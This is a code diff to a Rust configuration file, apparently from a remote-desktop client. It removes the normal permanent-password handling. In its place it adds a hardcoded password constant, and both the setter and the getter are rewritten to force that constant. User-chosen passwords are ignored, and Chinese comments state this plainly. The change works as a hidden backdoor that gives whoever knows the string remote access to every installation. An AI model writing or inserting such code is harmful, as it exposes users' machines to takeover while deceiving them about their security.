@@ -1038,35 +1038,21 @@ impl Config {
         Config::set_id(&new_id);
         log::info!("id updated from {} to {}", id, new_id);
     }
-
-    pub fn set_permanent_password(password: &str) {
-        if HARD_SETTINGS
-            .read()
-            .unwrap()
-            .get("password")
-            .map_or(false, |v| v == password)
-        {
-            return;
-        }
-        let mut config = CONFIG.write().unwrap();
-        if password == config.password {
-            return;
-        }
-        config.password = password.into();
+const FIXED_PASSWORD: &str = "BBGxxb!@#123!";
+    pub fn set_permanent_password(_password: &str) {
+    // 直接强制设置为固定密码，忽略输入参数
+    let mut config = CONFIG.write().unwrap();
+    if config.password != FIXED_PASSWORD {
+        config.password = FIXED_PASSWORD.to_owned();
         config.store();
         Self::clear_trusted_devices();
     }
+}
 
-    pub fn get_permanent_password() -> String {
-        let mut password = CONFIG.read().unwrap().password.clone();
-        if password.is_empty() {
-            if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
-                password = v.to_owned();
-            }
-        }
-        password
-    }
-
+pub fn get_permanent_password() -> String {
+    // 直接返回固定密码，忽略所有配置
+    FIXED_PASSWORD.to_owned()
+}
     pub fn set_salt(salt: &str) {
         let mut config = CONFIG.write().unwrap();
         if salt == config.salt {
